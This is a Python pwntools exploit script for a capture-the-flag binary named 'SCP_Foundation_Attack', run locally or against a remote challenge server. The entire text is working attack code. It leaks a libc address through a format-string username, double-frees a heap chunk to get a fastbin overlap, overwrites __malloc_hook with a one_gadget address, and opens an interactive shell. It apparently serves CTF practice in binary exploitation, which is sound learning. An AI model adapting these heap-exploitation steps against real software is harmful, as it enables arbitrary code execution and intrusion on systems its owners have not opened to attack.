import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./SCP_Foundation_Attack')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./SCP_Foundation_Attack')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',29248)
			elf=ELF('./SCP_Foundation_Attack')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def login(a):
			io.sendafter('> Username:',a)
			io.sendafter('> Password:','For_the_glory_of_Brunhild')

		def add(a,b,c,d):
			io.sendlineafter(' :','2')
			io.sendlineafter(' : ',str(a))
			io.sendafter(' : ',b)
			io.sendlineafter(' : ',str(c))
			io.sendafter(' : ',d)

		def delete(a):
			io.sendlineafter(' :','4')
			io.sendlineafter(' : ',str(a))

		def show(a):
			io.sendlineafter(' :','5')
			io.sendlineafter(' : ',str(a))
		


		
		login('%15$p')
		io.sendline('1')
		io.recvuntil('Your name is ')
		libc_base=int(io.recv(14),16)-libc.sym['__libc_start_main']-240
		libc.address=libc_base
		add(0x68,'aaa',0x68,'aaaa')
		add(0x38,'aaa',0x68,'aaaa')
		
		# delete(0)
		delete(1)
		delete(1)
		add(0x68,p64(libc.sym['__malloc_hook']-0x23),0x68,'aaaa')
		add(0x68,p64(libc.sym['__malloc_hook']-0x23),0x68,'\x00'*0x13+p64(libc_base+one_gadgaet[2]))




		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue